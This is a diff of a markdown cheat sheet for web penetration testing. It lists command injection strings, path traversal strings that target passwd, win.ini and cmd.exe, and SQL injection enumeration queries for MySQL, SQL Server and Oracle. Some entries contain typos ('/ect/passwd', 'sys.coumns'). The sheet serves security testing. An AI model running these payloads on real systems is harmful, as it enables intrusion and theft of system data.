@@ -11,8 +11,6 @@ Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
 Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
 
-
-
 > **File Inclusion**
 
 **Test Strings:**
@@ -23,7 +21,6 @@ Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passw
 Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
 Windows Test String 1 | <code> %WINDIR%\win.ini </code>
 Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
-
 
 **Using ZAP to Fuzz the URL:**
 1. Right click on request that looks injectable -> fuzz using
@@ -108,6 +105,14 @@ Oracle | ORA-01756: quoted string not properly terminated
 Oracle | <code> 'De'||'nt' </code>
 Oracle | <code> BITAND(1,1) </code>
 PostgreSQL | 5-digit Hex Error Code
+
+> **SQL Injection: Database, Table, and Columns
+
+Database Type | Database | Table | Columns
+============= | ======== | ===== | =======
+MySQL |	schema_name FROM information_schema.schemata | table_name FROM information_schema.tables | column_name From information_schema.columns
+SQL Server | name FROM sys.databases | name FROM sys.tables | name FROM sys.coumns
+Oracle DB | owner FROM all_tables | table_name FROM all_tables | column_name FROM all_tab_columns
 
 > **SQL Injection Union**
 
